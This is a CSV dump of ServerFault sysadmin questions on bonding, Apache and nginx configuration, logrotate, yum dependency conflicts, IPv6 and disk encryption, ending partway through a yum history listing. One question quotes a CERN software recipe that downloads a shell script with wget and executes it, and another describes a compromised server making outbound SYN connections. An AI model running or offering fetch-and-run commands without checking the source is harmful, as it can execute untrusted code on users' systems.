Id,Title,Body,Tags,CreationDate
"746322","How do I setup bonding on Centos 6.x for High Availability?","<p>My server has two Ethernet ports.  With Bonding I setup two different IP addresses for both.  The hardware is not very new, so I wouldn't expect that the newest versions of these features to work.  The problem is that it doesn't report any problem no matter what level I use.  There is no indication that this server with this switch does not support this or that setting in the configuration.  I believe there are 6 levels, from a course I took.  </p>

<p>I guess it helps to know the server model that I am using.  It is an HP Proliant DL365G5.  I did setup bond0 and the main interface and eth0 and eth1 are slaves to that master interface.  I asked someone elsewhere and he said that I need a router that supports high availability.  When I was learning about this it seemed to be more of a function of what the switch inside the server supports.</p>

<p>As an aside, I'm curious, my ISP offers fiber to the building.  So, I can get up to 1Gbps.  I hear some places are getting 2Gbps.  Would I need a 10Gbit switch for those situations?  But then again, if an ISP offers a maximum of 2Gbps coming into the home and you have wireless devices and various other wired connections, are they splitting the total of 2Gbps or by running some things in parallel can I get the full bandwidth on each device?
Thanks,
Bruce</p>
","<ubuntu><centos><high-availability><bonding>","2016-01-02 01:08:35"
"746347","I changed my vps port to 21 and now i cannot login as proftpd is installed in it","<p>While I was trying to change my port to another I didn't knew if i will give port 21 for vps the v-p-s will be locked, now i am not able to log-in in ssh, i can just log-in to proftpd as it is installed. Is there any way to change my VPS port to 22 in proftpd (the old one)?</p>

<p>I guess someone can solve my issue.</p>

<p>Help appreciated!</p>

<p>Thank you.</p>
","<linux><debian>","2016-01-02 08:29:14"
"746365","How to create a Pre-Installed Windows 7 VHD","<p>I am new into the world of servers. I was just working around creating a Windows 7 X64 Bootable VHD. Since my job profile makes me create windows 7 VMs every now and then, I want a pre-installed windows 7 VHD which I can simply attach in Hyper-v while I require it for testing. I may also use that VHD to dual boot inside my windows 8.1 Lenovo machine.</p>

<p>All I need is the installation to be skipped(or already completed) in that VHD.</p>

<p>Please Help! </p>
","<windows-7><virtual-machines>","2016-01-02 12:21:11"
"746373","how to decrypt a password in centos-71","<p>I have installed Oracle VM and on top of it Centos-71. I am logging into the centos by vigrant user and the password is also set during configuring it with chef. Is there a way to decrypt the password of root ?</p>
","<centos7><chef>","2016-01-02 15:03:28"
"746399","Avoid SSL warning when certificate is issued for root domain only","<p>I am having the following issue, trying to set up the SSL certificate. 
When opening the root domain name <code>example.com</code> the browser shows the green sign and all is fine. However trying to open with www version <code>www.example.com</code> I see the following message</p>

<blockquote>
  <p>www.example.com uses an invalid security certificate.</p>
  
  <p>The certificate is only valid for example.com</p>
  
  <p>(Error code: ssl_error_bad_cert_domain)</p>
</blockquote>

<p>From this message I am guessing that the SSL was issued for example.com only (please correct me if Im wrong), now except buying another certificate, that would include both versions, is there another way to avoid that warning, namely kind of to redirect all traffic to <code>example.com</code> before even ""showing"" to the browser the certificate ? So, when the user types <code>https://www.example.com</code> it would redirect to <code>https://example.com</code>, where the certificate is already valid.</p>

<p>I have this in my site file</p>

<pre><code>&lt;VirtualHost *:80&gt;
        ServerName example.com
        ServerAlias www.example.com
        Redirect / https://example.com/
&lt;/VirtualHost&gt;

&lt;VirtualHost *:443&gt;
        ServerName example.com
        ServerAlias www.example.com
        DocumentRoot /home/username/www/example

        SSLEngine on
        SSLCertificateFile /etc/apache2/ssl/example.com.crt
        SSLCertificateKeyFile /etc/apache2/ssl/example.com.private.key
        SSLCertificateChainFile /etc/apache2/ssl/example.com.intermediate.crt
&lt;/VirtualHost&gt;
</code></pre>

<p>I tried to put a redirect condition inside VH, however it did not help.</p>

<pre><code>RewriteCond %{HTTP_HOST} ^www.example.com
RewriteRule ^/(.*)$ https://example.com/$1 [L,R=301]
</code></pre>

<p>Apache 2.2.22, Debian 7.9</p>

<p>Thanks</p>
","<apache-2.2><ssl-certificate>","2016-01-02 21:29:23"
"746486","Kill A pid only if it is specific Program/Process","<p>Assuming that we have a PID Number how do i write <code>ONE bash command</code> to kill it if it is is specific program?</p>

<p>For example let's that that we have a pid number <strong>20000</strong> . <em>I want to kill that PID only if it is an FFmpeg Process</em></p>
","<linux><bash>","2016-01-03 17:38:43"
"746809","Logrotate not run","<p>I use <strong>ubuntu 14.04</strong>
I try to run logrotate each <strong>10min</strong> and remove all logs files bigger then <strong>2MB</strong>,
I try a lot solution but nothing not work, my logrotate run just 1 per day,
I try solution with moved logrotate from cron.daily to cron.hourly but not work,
I try other solution and do next:</p>

<p>create file logrotate:</p>

<pre><code>*/10  *  *  *  *   root /usr/sbin/logrotate /etc/logrotate.conf
</code></pre>

<p>and add in:</p>

<pre><code>/etc/cron.d
</code></pre>

<p>this is my /etc/logrotate.d/apache2:</p>

<pre><code>/var/log/apache2/*.log /var/log/apache2/domains/*log {
    weekly
    missingok
    rotate 10
    maxsize 2M
    compress
    delaycompress
    notifempty
    create 640 root adm
    sharedscripts
    postrotate
            /etc/init.d/apache2 reload &gt; /dev/null || true
            [ ! -f /var/run/nginx.pid ] || kill -USR1 `cat /var/run/nginx.pid`
    endscript
    prerotate
            if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
                    run-parts /etc/logrotate.d/httpd-prerotate; \
            fi; \
    endscript
}
</code></pre>
","<ubuntu><cron><logrotate>","2016-01-05 10:30:28"
"747077","DDos attack ToS Violation - Outbound DoS","<p>Fount ddos attack on ubuntu server</p>

<p><code>netstat -nputw</code></p>

<p>given outout</p>

<pre><code>Local Address       Foreign Address        State        PID/Program name

55.57.72.37:59792   123.166.137.95:25000    SYN_SENT    2890/ip6tablesu.sh
</code></pre>

<p>I found on internet that <code>123.166.137.95</code> is China's ip address</p>

<p>How should I block outbound traffic to that address?</p>
","<ubuntu><ddos>","2016-01-06 10:49:48"
"747235","Heavy stress test on Apache","<p>We have a production server running Apache that sometimes crashes because of too much load, I'm trying to replicate the situation on a test server in order to test Monit.
So my goal here is to overload Apache to make the service crash, or at least the render a website unavailable.</p>

<p>I was trying to do that with apache AB :
<code>ab -n 100000 -c 1000 http://webtest/</code> but it doesn't seem to be enough, despite /server-status/ showing all workers active... Is there a more powerfull alternative or a more efficient way to use <strong>ab</strong> to bring Apache to his knees?</p>

<p>Thanks!</p>
","<apache-2.2><monit><stress-testing>","2016-01-06 22:37:36"
"747250","Methods for installing rpms as a non-root user using apt?","<p>There is <a href=""https://twiki.cern.ch/twiki/bin/view/CMSPublic/SDTCMSSW_aptinstaller"" rel=""nofollow noreferrer"">a webpage</a> describes a method for  installing rpms as a non-root user using apt.</p>

<blockquote>
  <p>This page describes a simple method for <strong>installing the CMS software
  rpms as a non-root user using apt</strong>. A script developed by CMS,
  <a href=""http://cmsrep.cern.ch/cmssw/cms/bootstrap.sh"" rel=""nofollow noreferrer""><code>bootstrap.sh</code>,</a> provides the configuration necessary to use apt as a
  non-root user for software installation.</p>
</blockquote>

<p>Also look at the commands and the scripts mentioned in the commands:</p>

<blockquote>
  <p><strong>Recipe for the impatient (SH / BASH / ZSH):</strong></p>

<pre><code>export VO_CMS_SW_DIR=/x/y/z
# E.g.:
# export VO_CMS_SW_DIR=$PWD/w
export LANG=""C""
mkdir -p $VO_CMS_SW_DIR
wget -O $VO_CMS_SW_DIR/bootstrap.sh http://cmsrep.cern.ch/cmssw/cms/bootstrap.sh
# export BUILD_ARCH=slc5_amd64 # (only for online)
export SCRAM_ARCH=slc6_amd64_gcc491
sh -x $VO_CMS_SW_DIR/bootstrap.sh setup -path $VO_CMS_SW_DIR -arch $SCRAM_ARCH &gt;&amp; $VO_CMS_SW_DIR/bootstrap_$SCRAM_ARCH.log
</code></pre>
  
  <p>To install a new release:</p>

<pre><code>export VO_CMS_SW_DIR=/x/y/z
# E.g.:
# export VO_CMS_SW_DIR=$PWD/w
export LANG=""C""
# export BUILD_ARCH=slc5_amd64 (only for online)
export SCRAM_ARCH=slc6_amd64_gcc491
source $VO_CMS_SW_DIR/$SCRAM_ARCH/external/apt/*/etc/profile.d/init.sh
apt-get update
apt-get install cms+cmssw+CMSSW_7_4_4
NOTE : To use cmsShow with MAC OS in an FWLite build, you need to also add the FWLite data packages.
apt-get -y install cms+fwlite+CMSSW_7_4_4_FWLITE
apt-get -y install cms+fwlitedata-toolfile+1.0 cms+fwlitedata+25
</code></pre>
</blockquote>

<p>Their purpose is 
to ensure that proper dependencies will be satisfied.
They use host's linux at bare minimum and build all their software by themselves. Since hosts' linux may be outdated, they do not depend on specific Linux distribution.
All packages, e.g. gcc and python, are compiled by their software management tools.</p>

<p>I have never seen this before, so I wonder generally how one implements installing rpms as a non-root user using apt? (Not necessarily the method in the webpage, if you don't know it).</p>

<p>Do the methods work by creating some sort of virtual machines or some other kinds of virtualization?</p>

<p>Thanks.</p>
","<linux><virtualization>","2016-01-07 00:35:01"
"810120","How to setup mail relay at CentOs?","<p>I a totally newbie handling related to server. Now, my superior wants me to setup mail relay at centOs that will relay the mail to Y server. 
Centos does not have connection with our smtp server but Y server have. </p>

<p>the question is how to set up this mail relay?</p>

<p>thanks</p>
","<centos>","2016-10-20 01:50:57"
"810228","How to access a node server located on a virtual machine from the host pc?","<p>I have a simple node server running in a Virtual machine , using windows server 2012 . </p>

<p>I want to access the server from my host pc which has Windows 10 pro OS. </p>

<p>I can access the server from the guest pc by using :</p>

<pre><code>http://localhost:8081/customer
</code></pre>

<p>in the browser.</p>

<p>I have tried to find the IP address of the VM by using the <code>ipconfig</code> and <code>arp</code> commands but the IP address i got doesn't work (can t get a response)</p>

<p>I have tried specifying inbound and outgoing rules for the specific port in the Windows Server Firewall but the result was the same .</p>

<p>Finally i switched the firewall OFF but i still can't get a result . I m a newbie on servers and networks so I m sure i miss something </p>

<p>Any suggestions ?</p>
","<windows><virtual-machines>","2016-10-20 12:46:15"
"810312","How do you go about comparing two servers in order to figure out how many of one, you could replace with a newer one?","<p>How do you go about comparing two servers in order to figure out how many of one, you could replace with a newer one?</p>

<p>In particular, I have the following</p>

<p>Old server: ProLiant BL460c G6 (1.86 GHz, Intel Xeon E5502)
New server: ProLiant BL460c Gen9 (1.80 GHz, Intel Xeon E5-2630L v3)</p>

<p>I can go onto CPU benchmarking website and compare the CPUs <a href=""http://www.cpubenchmark.net/compare.php?cmp%5B%5D=1238&amp;cmp%5B%5D=2818"" rel=""nofollow noreferrer"">http://www.cpubenchmark.net/compare.php?cmp%5B%5D=1238&amp;cmp%5B%5D=2818</a>  (for a direct comparison) 
<a href=""https://www.spec.org/cgi-bin/osgresults"" rel=""nofollow noreferrer"">https://www.spec.org/cgi-bin/osgresults</a> (for benchnmark)</p>

<p>However, I am not sure how to be able to say that my G6s can be replaced by x G9s? How do I factor in core count and memory? Anyone know a smart way of doing this, or any other metrics to use? </p>
","<performance><benchmark>","2016-10-20 18:54:39"
"810379","How to fix dependenies error in this case? (centos 6)","<p>I try fix dependencies problem in this case. Can I get advise?</p>

<pre><code>Running rpm_check_debug
ERROR with rpm_check_debug vs depsolve:
mysql = 5.1.73-5.el6_6 is needed by (installed) mysql-server-5.1.73-5.el6_6.x86_64
** Found 13 pre-existing rpmdb problem(s), 'yum check' output follows:
coreutils-8.4-37.el6.x86_64 has missing requires of coreutils-libs = ('0', '8.4', '37.el6')
coreutils-libs-8.4-43.el6.x86_64 has missing requires of coreutils = ('0', '8.4', '43.el6')
1:cups-libs-1.4.2-74.el6.x86_64 is a duplicate with 1:cups-libs-1.4.2-72.el6.x86_64
glibc-2.12-1.166.el6_7.1.i686 has missing requires of glibc-common = ('0', '2.12', '1.166.el6_7.1')
glibc-2.14.90-14.x86_64 is a duplicate with glibc-2.12-1.166.el6_7.1.i686
libXinerama-1.1.3-4.fc23.i686 is a duplicate with libXinerama-1.1.3-2.1.el6.x86_64
libXrandr-1.4.2-2.fc23.i686 is a duplicate with libXrandr-1.4.1-2.1.el6.x86_64
libicu-4.2.1-14.el6.x86_64 is a duplicate with libicu-4.2.1-12.el6.x86_64
mysql-5.5.52-1.el6.remi.x86_64 has missing requires of real-mysql-libs(x86-64) = ('0', '5.5.52', '1.el6.remi')
mysql-devel-5.5.52-1.el6.remi.x86_64 has missing requires of libmysqlclient.so.18()(64bit)
mysql-devel-5.5.52-1.el6.remi.x86_64 has missing requires of real-mysql-libs(x86-64) = ('0', '5.5.52', '1.el6.remi')
mysql-server-5.1.73-5.el6_6.x86_64 has missing requires of mysql = ('0', '5.1.73', '5.el6_6')
poppler-0.12.4-10.el6.x86_64 is a duplicate with poppler-0.12.4-4.el6_6.1.x86_64
Your transaction was saved, rerun it with:
 yum load-transaction /tmp/yum_save_tx-2016-10-21-11-567RNI_J.yumtx
</code></pre>

<ol>
<li>I want remove @remi repos package (downgrade)</li>
<li>I want fix glibc package version error</li>
</ol>

<p>How Can I do?</p>
","<centos>","2016-10-21 03:03:33"
"810389","Making debian 8.5 two node failover cluster","<p>I am new here so take good care of me. I want to make failover cluster out of 2 debian 8.5 servers with mysql database. I need that both of them work on one ip (virtual). Can you suggest what clustering program to use and how to configure it? Thank you in advance.</p>
","<linux><debian><failovercluster>","2016-10-21 05:46:37"
"879329","Why does nginx select a location block with a non-matching regex?","<p>In my nginx config file I have this <code>location</code> block (modified for debugging purposes):</p>

<pre><code>location ~* \.(ico|css|js|gif|jpe?g|png)(\?[0-9]+)?$ {
    expires 1;
    log_not_found off;
    return 515 ""Request URI is $request_uri. Caught you"";
}
</code></pre>

<p>When I request this URI from the server:
<code>/img/signup/be0e1d34fabf2514d49db9baec09f858.png?w=198&amp;h=198&amp;s=9a7d22504c5ae176a936a0f18cccacba</code></p>

<p>sure enough, it matches and I get a 515 response with this body:
<code>Request URI is /img/signup/be0e1d34fabf2514d49db9baec09f858.png?w=198&amp;h=198&amp;s=9a7d22504c5ae176a936a0f18cccacba. Caught you</code></p>

<p>Why? The regex doesn't match, at least not intuitively (either it must end in a question mark followed by a series of digits, or in <code>.png</code> etc.), nor when I sense-checked it at <a href=""https://regex101.com/r/HtJaTM/1"" rel=""nofollow noreferrer"">Regex101.com</a>.</p>
","<nginx><regex>","2017-10-19 19:34:20"
"879393","Using at sign (@) in usernames linux. Is it safe?","<p>I've read about what charachers should usernames use, in linux, here: <a href=""https://serverfault.com/a/578264/330936"">https://serverfault.com/a/578264/330936</a> but I would like to know if is there any problem if I will use the at sign ""@"" in my usernames. I will use it especially for my ftp accounts (I have a simple webserver with CentOS 7).</p>

<p>I don't want to be portable to other older versions of linux, nor other distros (maybe debian).</p>

<p>Is there any problem in using <code>@</code> in usernames?</p>
","<linux><centos><user-accounts>","2017-10-20 07:59:29"
"879404","Why would you use Windows Server Core over Linux Server?","<p>I'm doing some study for the Microsoft 70-410 exam using Plural site and in the course the instructors into a bit of depth about server core, however watching the videos it looks like just a Windows version of a Linux server OS</p>

<p>Why would one use Server Core over a Linux Server OS?</p>
","<linux><windows><windows-server-2012-r2><windows-server-core>","2017-10-20 08:57:23"
"811072","Why do some countries have a co top-level domain instead of com and some have none?","<p>For example UK has co.uk while still use 3 letters in other top-level domains like org.uk . </p>

<p>Germany use only .de.</p>

<p>Look at that list for example:</p>

<p><a href=""https://en.wikipedia.org/wiki/List_of_Google_domains"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/List_of_Google_domains</a></p>
","<domain-name-system>","2016-10-25 01:29:14"
"879564","Execute PHP in subdirectory location Nginx","<p>I have the problem that when I want to run the PHP script it does not run</p>

<p><strong>File Structure</strong></p>

<pre><code>/home/myapp/landing
* contact.php
* index.html
</code></pre>

<p><strong>NGINX Conf</strong></p>

<pre><code>location / {
    alias /home/myapp/main;
}

location /landing-page {
     alias /home/myapp/landing/;

     location ~ \.php$ {
          try_files $uri =404;
          fastcgi_split_path_info ^(.+\.php)(/.+)$;
          fastcgi_pass unix:/path/to/php.sock;
          fastcgi_index index.php;
          fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
          #also tried this
          #fastcgi_param SCRIPT_FILENAME /home/myapp/landing$fastcgi_script_name;
          include fastcgi_params;
     }
}
</code></pre>
","<nginx><php><php-fpm>","2017-10-21 00:47:07"
"811420","IPv6 and /64 block allocation","<p>I'm sure this is a FAQ, but I can't find any clear answer. From what I understand, IPv6 addresses should be allocated in /64 blocks. Many articles are warning against using anything less, which might break some protocol expectations.</p>

<p>Does this mean that in IPv6 a /64 block should be treated as a single IPv4 address?</p>

<p>Can someone give me examples of practical problems I'd be facing if I went ahead and built a local network inside the /64 block?</p>
","<ipv6>","2016-10-26 13:46:11"
"879997","dont run php on my liux server","<p>i step by step install apache and php on my VPS
<a href=""https://www.digitalocean.com/community/tutorials/how-to-install-the-apache-web-server-on-ubuntu-16-04"" rel=""nofollow noreferrer"">Install Apache</a>
<a href=""https://www.digitalocean.com/community/tutorials/how-to-upgrade-to-php-7-on-ubuntu-14-04"" rel=""nofollow noreferrer"">Install PHP7</a></p>

<p>after install and config my apache and php i see my php code on page.</p>

<p>like this:</p>

<pre><code>&lt;?php

defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_ENV') or define('YII_ENV', 'dev');

require(__DIR__ . '/../vendor/autoload.php');
require(__DIR__ . '/../vendor/yiisoft/yii2/Yii.php');

$config = require(__DIR__ . '/../config/web.php');

(new yii\web\Application($config))-&gt;run();
</code></pre>
","<ubuntu><php><apache-2.4>","2017-10-24 11:57:05"
"880191","Combining Resources of Multiple Servers","<p>Can we combine resources of multiple servers into 1 and then create multiple vps's from the combined resources? For Example: Lets assume i have multiple servers with different HDD, RAM and Processor sizes and with any tool / mechanism,  i could combined their resources and create multiple VPS of different sizes?</p>
","<vps><hardware><cluster><resources>","2017-10-25 11:16:20"
"880339","Redirect everything to https in Nginx","<p>How to redirect every vhost to https but without duplicating configuration. I have 4 websites on the same vps running Nginx and I want to redirect everything to https. </p>
","<nginx>","2017-10-25 23:27:32"
"880718","Can I whitelist a cloaked IP address for a 3rd party API?","<p>A 3rd party API (Poloniex) requires an IP address to be whitelisted. In my case, my server's true IP needs to be whitelist which requires me to divulge it to users (which is a security hole). I'm looking for a solution to provide some sort of cloaked IP address that can be whitelisted.</p>

<p>I use CloudFlare for DNS which makes my public IP address different than the true one, but when whitelisting this IP, it doesn't work.</p>

<p>Are there any workarounds to provide some sort of alias IP that would act the same as the true IP for whitelisting? Thanks.</p>
","<linux><ip>","2017-10-28 02:43:50"
"880983","Software-RAID1 in Virtualization","<p>I got a little homeserver which runs a Windows as FileServer and hosts a Ubuntu-VM for little monitoring tasks and other stuff that are not available in Windows.<br>
In the past however, this lead to some unnecessary downtimes, because of reboots wich were caused by Windows-Updates.</p>

<p>I now want to reinstall the system to have a fully virtualized System where <strong>both Windows and Ubuntu</strong> are <strong>virualized</strong>. However the Windows (used as Fileserver) should have a RAID1-Setup for the famalys data. (i don't think it does matter if the RAID runs within the Windows-VM or on the Host System?)</p>

<p>Someone knows what the best solution is for this? I tried XenServer and VMWares ESXi, but ESXi does not detect my NIC and XenServer is neither capable of RAID1 Setups nor HDD-Disk pathtrough.</p>

<p>Someone got any ideas how to do this?<br>
Note: The Ubuntu-VM does need a Serial-Device from the USB-Hub.</p>

<p>HDDs:</p>

<ul>
<li>1x 120GB SSD - Host OperatingSystem + VMs</li>
<li>2x 10TB HDD - Should run in RAID1 and hold Familys Data</li>
</ul>
","<virtualization><vmware-esxi><software-raid><xenserver>","2017-10-30 12:03:18"
"881316","How can ossec handle a virus that already spread into the deepest system?","<p>As far as I know, OSSEC is a Open Source HIDS. It's a ""Detection System"". I read in journals, it collect logs and flag any anomaly that had been found in a system ( e.g. Debian Server ) and do some action with it.</p>

<p>Some of the OSSEC's rules, there's like a possible way for prevent the anomaly for doing it action like, prevent brute force by blocking an IP for 600 seconds if the authentication failed 2 times.</p>

<p>My question, How can OSSEC handle a virus that already spreading ? OSSEC is just like detect the anomaly and do some action. What could ossec do if this condition were happen. Is there any logic I can put into ossec rules that disconnect all the Network or there is another way ?. Is it possible ?</p>
","<ossec><ids>","2017-11-01 07:58:55"
"881364","Apache 2.4 - Redirect Folder to Sub-domain","<p>I have an application running at <a href=""https://webapp.ex"" rel=""nofollow noreferrer"">https://webapp.ex</a> - An external application downloads hundreds of PDFs from within the application directory (e.g. <a href=""https://webapp.ex/Modules/sub/directory/study.pdf"" rel=""nofollow noreferrer"">https://webapp.ex/Modules/sub/directory/study.pdf</a>) - The 'Modules' directory has grown significantly and I would like to separate it by moving the Modules folder to a separate directory outside my application root.</p>

<p>I've done this by creating a separate virtual host and now have <a href=""https://modules.webapp.ex"" rel=""nofollow noreferrer"">https://modules.webapp.ex</a> and can access the files at <a href=""https://modules.webapp.ex/Modules/sub/directory/study.pdf"" rel=""nofollow noreferrer"">https://modules.webapp.ex/Modules/sub/directory/study.pdf</a> - However, I will have to update the URLs for over 300 courses on an external application to fetch the PDFs. </p>

<p>I am trying to avoid this by using Apache Mod rewrite with a rule that redirects all requests to <a href=""https://webapp.ex/Modules/"" rel=""nofollow noreferrer"">https://webapp.ex/Modules/</a>* to the new sub-domain <a href=""https://modules.webapp.ex/Modules/"" rel=""nofollow noreferrer"">https://modules.webapp.ex/Modules/</a>* - This way, PDFs are still delivered and I can delete the former directory.</p>

<p>After reading through some ServerFault answers, I came up with the following:</p>

<pre><code>RewriteEngine On
RewriteCond %{HTTP_HOST} ^webapp.ex !^/Modules [NC]
RewriteRule ^(.*)$ https://modules.webapp.ex/$1 [L,R=301]
</code></pre>

<p>I added the above to my VirtualHost and Apache fails to restart with this error</p>

<blockquote>
  <p>AH00526: Syntax error on line 77 of
  /etc/apache2/sites-enabled/acms.conf: RewriteCond: bad flag delimiters
  Action 'configtest' failed. The Apache error log may have more
  information.</p>
</blockquote>

<p>I've checked the rewrite statement above using <a href=""http://htaccess.mwl.be/"" rel=""nofollow noreferrer"">this tool</a> and this URL: <a href=""http://htaccess.mwl.be/"" rel=""nofollow noreferrer"">http://htaccess.mwl.be/</a> - I'm not sure why Apache is crying. Please help!</p>
","<linux><apache-2.4><mod-rewrite>","2017-11-01 14:01:28"
"881377","What happens when an encrypted drive that is running (and thus decrypted) is unplugged?","<p>Encrypted drives are usually decrypted at boot, so if the system is running live and the drive is unplugged while ""hot"" and plugged into another system will the data still be unencrypted?</p>

<p>I may be misunderstanding the implementation here, but let's use a LUKS encrypted drive as the example. Is the decryption handled in RAM or something like that (as opposed to decrypting the underlying, smaller mapper)? If this is the case, then it wouldn't matter if the drive was taken out because it would not be decrypted, whereas if it is done on the mapper for the encryption (written as decrypted) it would likely persist as decrypted between swapping the drive.</p>
","<hard-drive><encryption><luks>","2017-11-01 15:49:30"
"881439","Unsuccessful clean install on a Macbook Pro Late 2011","<p>I've already worked on several Macbooks, reinstalling them, formatting, changing drives, etc. and normally it's a relatively simple process.</p>

<p>But I just got a 13"" late 2011 Macbook Pro which just won't accept a new installation.</p>

<p>I switched the main drive with a 240GB Kingston SSD, I upgraded the ram from 4 to 8 GB and it turns on without any issues. I previously formatted the drive on another Macbook to the correct format to avoid the installer not detecting it.</p>

<p>I created a bootable USB High Sierra installer, following every step by the book. I am able to boot the installer normally, when I open the disk utility it detects the hard drive.</p>

<p>When I click on Install MacOS High Sierra it thinks for a few seconds and then tells me ""The MacOS installer is damaged and cannot be used to install"". I tried doing the installer from a freshly downloaded High Sierra Installer two or three more times... no difference. I tried using Sierra, exactly the same error message.</p>

<p>I disabled System Integrity Protection and restarted, same error.</p>

<p>I installed the OS on the hard drive using another Macbook with the same USB without any issues. Then I tried putting the SSD in the problematic Macbook and it doesn't detect any bootable OS. I even booted again and told it to use the SSD as startup drive... it even detects the OS version. Nothing, after a few seconds it shows the folder with a question mark on it.</p>

<p>I thought maybe the computer is not compatible with High Sierra, but the other Macbook is older than this one and it had no issues installing the OS.</p>

<p>I tried using Internet Recovery, but after a while it shows me an error and does nothing. I checked and found out that some models have issues doing internet recovery via Wi-Fi and connected it to a cable and got the same result.</p>

<p>I am starting to consider downloading an older OS and boot via DVD, because this is just annoying right now.</p>
","<mac-osx><boot><operating-system>","2017-11-02 00:50:02"
"881623","ec2 Apache Server http-500 troubleshooting","<p>My website was being funky so I rebooted my server.  I also ran sudo yum update and updated everything.  Now my website wont load (www.kisnardonline.com) and I get http-500 errors.  I am not 100% sure if it was related to the update or not.  I have googled a bunch, but have no ideas what else to look at.</p>

<p>It looks like the update did not overwrite my config files so I am not sure what could have broken?</p>

<p>I am able to SSH to my server.  I am able to connect to my MySQL db.  I am able to run my java game server and connect with my game client from my local pc.  Top output looks fine to me (plenty of memory and cpu).  Anything else I can check?</p>

<p><strong>yum history info 77</strong></p>

<pre><code>Loaded plugins: priorities, update-motd, upgrade-helper
Transaction ID : 77
Begin time     : Thu Nov  2 23:49:20 2017
Begin rpmdb    : 482:891f2e1355453f459cb67e212feb05d2fcd0d421
End time       :            23:50:29 2017 (69 seconds)
End rpmdb      : 492:cfa44d8f63026943da406a0b769ab02395772f96
User           : EC2 Default User &lt;ec2-user&gt;
Return-Code    : Success
Command Line   : update
Transaction performed with:
    Installed     rpm-4.11.3-21.75.amzn1.x86_64 @amzn-main
    Updated       yum-3.4.3-150.68.amzn1.noarch @amzn-main
Packages Altered:
    Updated     authconfig-6.2.8-10.28.amzn1.x86_64                           @amzn-main
    Update                 6.2.8-30.31.amzn1.x86_64                           @amzn-main
    Updated     aws-amitools-ec2-1.5.12-0.1.amzn1.noarch                      @amzn-main
    Update                       1.5.13-0.2.amzn1.noarch                      @amzn-main
    Updated     aws-cfn-bootstrap-1.4-15.9.amzn1.noarch                       @amzn-updates
    Update                        1.4-24.16.amzn1.noarch                      @amzn-updates
    Updated     aws-cli-1.11.83-1.46.amzn1.noarch                             @amzn-updates
    Update              1.11.132-1.47.amzn1.noarch                            @amzn-main
    Updated     bash-4.2.46-20.36.amzn1.x86_64                                @amzn-main
    Update           4.2.46-28.37.amzn1.x86_64                                @amzn-main
    Updated     bind-libs-32:9.8.2-0.62.rc1.54.amzn1.x86_64                   @amzn-updates
    Update                32:9.8.2-0.62.rc1.56.amzn1.x86_64                   @amzn-main
    Updated     bind-utils-32:9.8.2-0.62.rc1.54.amzn1.x86_64                  @amzn-updates
    Update                 32:9.8.2-0.62.rc1.56.amzn1.x86_64                  @amzn-main
    Updated     binutils-2.23.52.0.1-55.65.amzn1.x86_64                       @amzn-updates
    Update               2.25.1-31.base.66.amzn1.x86_64                       @amzn-main
    Updated     curl-7.51.0-4.73.amzn1.x86_64                                 @amzn-main
    Update           7.53.1-10.77.amzn1.x86_64                                @amzn-updates
    Updated     datadog-agent-1:5.13.2-1.x86_64                               @datadog
    Update                    1:5.18.1-1.x86_64                               @datadog
    Updated     ec2-net-utils-0.5-1.32.amzn1.noarch                           @amzn-updates
    Update                    0.5-1.33.amzn1.noarch                           @amzn-main
    Updated     ec2-utils-0.5-1.32.amzn1.noarch                               @amzn-updates
    Update                0.5-1.33.amzn1.noarch                               @amzn-main
    Updated     file-5.22-4.31.amzn1.x86_64                                   @amzn-updates
    Update           5.30-11.34.amzn1.x86_64                                  @amzn-main
    Updated     file-libs-5.22-4.31.amzn1.x86_64                              @amzn-updates
    Update                5.30-11.34.amzn1.x86_64                             @amzn-main
    Updated     glibc-2.17-157.169.amzn1.x86_64                               @amzn-updates
    Update            2.17-196.172.amzn1.x86_64                               @amzn-main
    Updated     glibc-common-2.17-157.169.amzn1.x86_64                        @amzn-updates
    Update                   2.17-196.172.amzn1.x86_64                        @amzn-main
    Updated     glibc-devel-2.17-157.169.amzn1.x86_64                         @amzn-updates
    Update                  2.17-196.172.amzn1.x86_64                         @amzn-main
    Updated     glibc-headers-2.17-157.169.amzn1.x86_64                       @amzn-updates
    Update                    2.17-196.172.amzn1.x86_64                       @amzn-main
    Updated     grep-2.20-2.17.amzn1.x86_64                                   @amzn-main
    Update           2.20-3.18.amzn1.x86_64                                   @amzn-main
    Updated     grubby-7.0.15-5.7.amzn1.x86_64                                ?
    Update             7.0.15-7.8.amzn1.x86_64                                @amzn-main
    Updated     gzip-1.5-8.18.amzn1.x86_64                                    @amzn-main
    Update           1.5-9.19.amzn1.x86_64                                    @amzn-main
    Updated     httpd24-2.4.25-1.68.amzn1.x86_64                              @amzn-updates
    Update              2.4.27-3.75.amzn1.x86_64                              @amzn-main
    Updated     httpd24-tools-2.4.25-1.68.amzn1.x86_64                        @amzn-updates
    Update                    2.4.27-3.75.amzn1.x86_64                        @amzn-main
    Updated     initscripts-9.03.49-1.35.amzn1.x86_64                         @amzn-updates
    Update                  9.03.58-1.39.amzn1.x86_64                         @amzn-main
    Updated     java-1.8.0-openjdk-1:1.8.0.131-2.b11.30.amzn1.x86_64          @amzn-updates
    Update                         1:1.8.0.151-1.b12.35.amzn1.x86_64          @amzn-updates
    Updated     java-1.8.0-openjdk-headless-1:1.8.0.131-2.b11.30.amzn1.x86_64 @amzn-updates
    Update                                  1:1.8.0.151-1.b12.35.amzn1.x86_64 @amzn-updates
    Erase       kernel-4.9.20-10.30.amzn1.x86_64                              @amzn-updates
    Install     kernel-4.9.58-18.51.amzn1.x86_64                              @amzn-updates
    Updated     kernel-headers-4.9.27-14.31.amzn1.x86_64                      @amzn-updates
    Update                     4.9.58-18.51.amzn1.x86_64                      @amzn-updates
    Updated     krb5-libs-1.14.1-27.41.amzn1.x86_64                           @amzn-updates
    Update                1.15.1-8.43.amzn1.x86_64                            @amzn-updates
    Updated     krb5-workstation-1.14.1-27.41.amzn1.x86_64                    @amzn-updates
    Update                       1.15.1-8.43.amzn1.x86_64                     @amzn-updates
    Updated     libcurl-7.51.0-4.73.amzn1.x86_64                              @amzn-main
    Update              7.53.1-10.77.amzn1.x86_64                             @amzn-updates
    Updated     libgcc48-4.8.3-9.111.amzn1.x86_64                             @amzn-main
    Update               4.8.5-11.135.amzn1.x86_64                            @amzn-main
    Updated     libkadm5-1.14.1-27.41.amzn1.x86_64                            @amzn-updates
    Update               1.15.1-8.43.amzn1.x86_64                             @amzn-updates
